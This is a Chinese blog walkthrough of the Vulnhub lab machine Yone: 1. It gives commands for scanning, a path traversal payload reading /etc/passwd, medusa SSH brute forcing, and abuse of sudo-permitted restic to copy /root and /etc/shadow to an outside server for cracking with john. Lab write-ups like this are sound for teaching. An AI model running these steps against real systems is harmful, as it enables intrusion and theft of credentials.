---
title: Yone
published: 2026-08-19
description: 对 Vulnhub 靶机 Yone 的完整渗透测试记录，涵盖从信息收集到获取 root 权限的完整过程。
image: ./images/Pasted image 20260817205019.png
tags:
  - Vulnhub
  - 渗透测试
  - 靶机
  - 提权
category: Vulnhub靶场
draft: false
pinned: false
lang: zh-CN
author: Ynm
comment: true
---

| **项目**         | **详情**                                                                  |
| -------------- | ----------------------------------------------------------------------- |
| **靶机名称**       | Yone: 1                                                                 |
| **难度等级**       | Medium（中等）                                                              |
| **目标**         | 获取 root 权限并找到 `/root` 目录下的 flag                                         |
| **下载链接**       | https://www.vulnhub.com/entry/yone-1,543/#download|
| **攻击机 (Kali)** | `192.168.197.10`（建议使用 NAT 模式）                                           |
| **靶机 (Yone)**  | `192.168.197.172`（DHCP 自动分配）                                            |
## 一、 信息收集 (Reconnaissance)

信息收集是渗透测试的基石，决定了后续攻击面的广度。

### 1.1 主机发现
使用 `nmap` 在本地网络中定位靶机 IP。
```
nmap -sn 192.168.197.0/24
```
![](images/Pasted%20image%2020260817233959.png)
结果输出：发现目标 IP 为：`192.168.197.172`
### 1.2 端口与服务扫描
使用 Nmap 对靶机进行全面的端口和服务扫描。

```
nmap -p- --min-rate 1000 192.168.197.172        # 快速全端口扫描
```
![](images/Pasted%20image%2020260817234249.png)
```
nmap -p 22,80 -sV -sC -O 192.168.197.172   # 深入服务探测
```
![](images/Pasted%20image%2020260817234502.png)
**扫描结果分析**：

| 端口 | 服务 | 状态 | 初步判断 |
| :--- | :--- | :--- | :--- |
| 22 | SSH | 开放 | 可能存在爆破或密钥泄露风险 |
| 80 | HTTP | 开放 | 主要 Web 攻击面 |
## 二、 Web 渗透 (Web Penetration)

Web 服务通常是突破口，需要细致地挖掘每一个细节。

### 2.1 绑定 Hosts 文件
直接访问 IP 的 80 端口，发现图片无法显示。
![](images/Pasted%20image%2020260818104522.png)
查看图片地址，发现其指向了一个域名 `yone.lc`。
![](images/Pasted%20image%2020260818104607.png)
这意味着我们需要在攻击机的 `/etc/hosts` 文件中手动添加域名解析。
> 注意：由于 `yone.lc` 是一个并不存在于互联网公共 DNS（域名系统）中的“假域名”（这本应该是服务器（靶机）自己在公共 DNS 建立的域名，但是这里的服务器是靶机，因此公共 DNS 没有该域名，需要在kali里面手动添加），所以kali根本不认识它，无法解析出 IP，图片自然就加载失败了。
```
sudo echo "192.168.197.172    yone.lc" >> /etc/hosts
```
![](images/Pasted%20image%2020260818105640.png)
### 2.2 网站功能探索
使用域名 `http://yone.lc` 访问网站，发现这是一个可以**注册新用户**的 Web 应用。
![](images/Pasted%20image%2020260818110110.png)
**操作步骤**：
1.  注册一个新账号并登录（ynm/123456）。
![](images/Pasted%20image%2020260818110220.png)
2.  登录后，首页是一个**文件上传**页面，并且已经存在两个上传过的图片。
![](images/Pasted%20image%2020260818110336.png)
### 2.3 发现路径遍历漏洞 (Path Traversal)
点击第一张图片，发现 URL 中存在一个参数 `link`：
`http://yone.lc/download?link=right.jpg`
![](images/Pasted%20image%2020260818110619.png)
这是一个典型的文件下载功能，可以尝试进行**路径遍历攻击**，读取系统敏感文件。
> 注意：如果这里点击第二张图片，会直接下载，因此没有收获。

**验证 Payload**：
`http://yone.lc/download?link=../../../../../../../../etc/passwd`
![](images/Pasted%20image%2020260818110954.png)
**结果**：
成功读取到 `/etc/passwd` 文件，确认存在路径遍历漏洞。

在 `/etc/passwd` 文件中，我们注意到一个本地用户 `yone`。
![](images/Pasted%20image%2020260818111623.png)
## 三、 获取初始 Shell (Initial Access)

既然已知系统存在用户 `yone` 且 SSH 服务开启，最直接的方式就是进行密码爆破。
> **这里有几个问题，解答如下：**
> 
> **1.为什么这里不直接对root用户进行爆破呢，除了题目名字为yone以外还有其他原因吗？**
> 
> 答：理论是可行的，但是有几个问题。第一，绝大多数 Linux 发行版（包括 Ubuntu）的 SSH 服务默认配置中，禁止 root 用户通过 SSH 进行密码登录。第二， root 是系统最高权限账户，管理员在设置时通常会使用更长、更复杂的密码，如本次 Yone 靶机中的root密码实际是123456789!@#$%^&\*(。第三，爆破 root 会产生大量 SSH 登录失败日志（/var/log/auth.log），更容易触发告警机制（如 fail2ban），导致攻击 IP 被封锁。爆破普通用户相对隐蔽，且即使失败，也不如 root 爆破那样引起管理员的立即警觉。
> 
> **2.能不能不获得/etc/passwd文件，直接使用字典对SSH进行爆破？**
> 
> 
> 答：理论可行，但实际不行。用户名未知等价于爆破成本指数级增加。如果既不知道用户名，也不知道密码，爆破的组合是：用户名 × 密码 = 待尝试次数。假设字典有 10000 个用户名、10000 个密码，就需要尝试 1 亿次。而通过信息收集（如读取 /etc/passwd）获取到有效用户名 yone 后，爆破组合骤降为：1 个用户名 × 10000 个密码 = 10000 次，效率提升了 10000 倍，这在实战中意味着几小时 vs 几天的差距。
> 
> **3.能不能直接通过路径遍历漏洞读取 /etc/shadow 文件？**
> 
> 答：虽然我成功读取了 /etc/passwd，是因为该文件权限通常是 644 (-rw-r--r--)，允许所有用户读取。但这只是特例，不代表能读取所有系统文件。/etc/shadow 的文件默认权限通常是 -rw-r-----，其数字权限为 640，文件所有者是 root 用户，所属组是 shadow 组。因此所有者 (root)：拥有读写权限 (rw-)；所属组 (shadow)：拥有只读权限 (r--)；其他用户：没有任何权限 (---)。这意味着，只有 root 用户和 shadow 组的成员才能读取 /etc/shadow。
>![](images/Pasted%20image%2020260818115515.png)

### 3.1 SSH 密码爆破
使用 `medusa` 对 `yone` 用户进行 SSH 密码爆破。

> **为什么用 Medusa？** 可使用 `hydra`、`medusa` 或 Metasploit 等工具。由于根据网上一些资料显示 `hydra` 在此场景下运行较卡顿，因此改用 `medusa` 进行爆破。

```
medusa -u yone -P /root/字典/rockyou_2025_00.txt -h 192.168.197.172 -M ssh -F -t 10 | grep -E "ACCOUNT FOUND|SUCCESS"
```
**参数说明**：
- `-u yone`：指定单一用户名。
- `-P`：指定密码字典文件。
- `-h`：指定目标主机 IP。
- `-M ssh`：指定爆破的服务为 SSH。
- `-F`：一旦找到正确的密码就停止爆破。
- `-t 10`：指定线程数为 10。
![](images/Pasted%20image%2020260818170725.png)
![](images/Pasted%20image%2020260818170445.png)

**爆破结果**：用户名`yone`，密码`12345qwert`。

### 3.2 连接 SSH
使用获取到的凭据成功登录 SSH。
```
ssh yone@192.168.197.172
```
查看当前的权限：
```
yone@ubuntu:~$ id
uid=1000(yone) gid=1000(yone) groups=1000(yone)
```
![](images/Pasted%20image%2020260818170245.png)
## 四、 权限提升 (Privilege Escalation)

现在的目标是从普通用户 `yone` 提权至 `root`。
### 4.1 检查 Sudo 权限
输入 `sudo -l` 查看当前用户能以 root 权限执行哪些命令，且无需root密码（只需要当前用户的密码）。

```
sudo -l
```
![](images/Pasted%20image%2020260818171408.png)
**关键发现**：
用户可以无密码地以 root 权限执行 `/usr/bin/restic backup -r rest*`。

### 4.2 利用 Restic 提权
经过百度上的搜索，`restic` 是一个备份程序。如果我们可以控制 `restic` 的备份目标，就能利用它以 root 权限读取任意文件。

**攻击思路**：在攻击者控制的服务器上搭建一个 `restic` 服务端，然后让靶机上的 `restic` 以 root 权限将敏感文件（如 `/root/flag.txt` 或 `/etc/shadow`）备份到我们的服务器上。

#### 步骤 1：在攻击机（或公网服务器）上搭建 Restic Server

由于靶机可能无法主动连接内网，建议使用具有公网 IP 的云服务器。

> ⚠️ **网络注意**：由于靶机和攻击机在同一内网，靶机可以主动连接公网，但**不能主动连接内网**，因此反弹 Shell 会失败。所以需要在**公网云服务器**上搭建 `restic` 服务端进行监听，而非在本地 Kali 上。

我使用阿里云服务器，购买成功之后，安装 Golang 和 Restic，然后启动 Restic 服务。
```
# 安装 Golang 和 Restic
apt install -y golang restic

# 克隆并编译 rest-server
git clone https://github.com/restic/rest-server.git
cd rest-server
export GOPROXY="https://goproxy.cn"
CGO_ENABLED=0 go build -o rest-server ./cmd/rest-server

# 启动服务（注意：--no-auth 表示无认证，仅用于实验环境）
./rest-server --no-auth
```
默认监听端口为 8000。
![](images/Pasted%20image%2020260819125152.png)
#### 步骤 2：在靶机上初始化备份仓库
在靶机 (`yone`) 上，使用 `restic` 客户端初始化一个指向我的服务器的仓库，并设置密码。

```
restic -r rest:http://47.122.104.169:8000/rest1 init
```
此处密码设置为 `123456`。
![](images/Pasted%20image%2020260819130021.png)
#### 步骤 3：以 Root 权限备份敏感文件
现在，使用 `sudo` 以 root 权限执行 `restic backup` 命令，将 `/root` 目录备份到我的服务器。

```
sudo /usr/bin/restic backup -r rest:http://47.122.104.169:8000/rest1 /root
```
![](images/Pasted%20image%2020260819130647.png)
### 4.3 获取 Flag
在攻击机的 Restic 服务器上，可以通过 `restic` 命令查看并恢复备份文件，从而获取 flag。
#### 步骤 1：列出所有备份快照

首先查看已备份的快照列表，获取快照 ID：

```
restic -r rest:http://47.122.104.169:8000/rest1 snapshots
```
![](images/Pasted%20image%2020260819131926.png)
#### 步骤 2：创建挂载点目录并挂载 Restic 仓库

```
mkdir -p /mnt/restic

restic -r rest:http://47.122.104.169:8000/rest1 mount /mnt/restic
```

输入仓库密码（本例为 `123456`）后，会看到如下提示：
![](images/Pasted%20image%2020260819132516.png)
> ⚠️ **注意**：挂载命令会保持前台运行，需要**另开一个 SSH 终端**来浏览备份内容。

#### 步骤 3：使用 `tree` 查看目录结构

在**第二个 SSH 终端**中，使用 `tree` 命令查看挂载点的完整目录结构：

```
tree /mnt/restic
```
![](images/Pasted%20image%2020260819132547.png)
从 `tree` 的输出可以看到，`root.txt` 位于 `/mnt/restic/snapshots/latest/root/` 目录下。

#### 步骤 4：读取 Flag

```
cat /mnt/restic/snapshots/latest/root/root.txt
```

![](images/Pasted%20image%2020260819132610.png)
#### 步骤 5：停止挂载（可选）

在运行 `restic mount` 的终端中按 `Ctrl+C` 即可停止挂载服务。

```plaintext
^C
unmounting /mnt/restic...
```
到这里我们已经成功拿到root.txt，本靶场到这里就完结了，但是为了能真正拿到root权限，我们还是拿到root密码吧。
## 五、 Root 密码获取

### 5.1 备份 Shadow 文件

重复上述备份步骤，可以新建一个 `rest2` 存档，也可以复用之前的仓库，这里直接复用已有的 `rest1` 仓库，备份 `/etc/shadow` 文件：
```
sudo /usr/bin/restic backup -r rest:http://47.122.104.169:8000/rest1 /etc/shadow
```
![](images/Pasted%20image%2020260819133002.png)
备份完成后，此时 `rest1` 仓库中包含两个快照：`/root` 和 `/etc/shadow`。在云服务器上查看所有快照，记下备份 `shadow` 的快照 ID（fb1de187）：
```
restic -r rest:http://47.122.104.169:8000/rest1 snapshots
```
![](images/Pasted%20image%2020260819133214.png)
然后使用 `restore` 提取 `shadow` 文件：
```
mkdir -p /tmp/shadow_extract

restic -r rest:http://47.122.104.169:8000/rest1 restore fb1de187 --target /tmp/shadow_extract
```

然后直接使用XTFP即可查看/tmp/shadow_extract/etc下的shadow文件，双击即可下载到本地。当然这里也可以使用命令下载，或者直接在服务器上面使用cat命令查看。
![](images/Pasted%20image%2020260819133716.png)
![](images/Pasted%20image%2020260819133812.png)
### 5.2 合并 Passwd 与 Shadow

将之前通过路径遍历获取的 `/etc/passwd` 和现在获取的 `/etc/shadow` 结合，使用 `unshadow` 命令将其转换为可用于破解的哈希格式：

```
unshadow passwd.txt shadow.txt > hash.txt
```
![](images/Pasted%20image%2020260819134557.png)
编辑生成的文件，**只保留 `root` 和 `yone` 用户**的相关行。
![](images/Pasted%20image%2020260819134714.png)
### 5.3 破解密码哈希

使用 Kali 自带的字典（如 `rockyou.txt`）进行破解：

```
# 解压 rockyou.txt
sudo gunzip /usr/share/wordlists/rockyou.txt.gz

john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

经过约半个小时的破解，成功获取 root 密码：
![](images/Pasted%20image%2020260819142839.png)
> **root 密码**：`123456789!@#$%^&*(`

### 5.4 切换 Root 权限

使用破解出的密码切换至 root 用户：

```
su root
```
![](images/Pasted%20image%2020260819143448.png)
成功获取 root 权限，靶机渗透完成。

## 六、 总结与复盘

### 6.1 攻击路径总结
1.  **信息收集**：通过端口扫描发现 22 和 80 端口。
2.  **Web 侦察**：发现域名 `yone.lc` 并绑定 hosts，注册账号探索功能。
3.  **漏洞发现**：在文件下载功能点发现路径遍历漏洞，读取 `/etc/passwd`。
4.  **获取 Shell**：利用读取到的用户名 `yone`，通过 Medusa 爆破 SSH 密码获取初始访问权。
5.  **权限提升**：通过 `sudo -l` 发现 `restic` 命令的滥用机会，搭建服务端，利用备份功能窃取 root 敏感文件。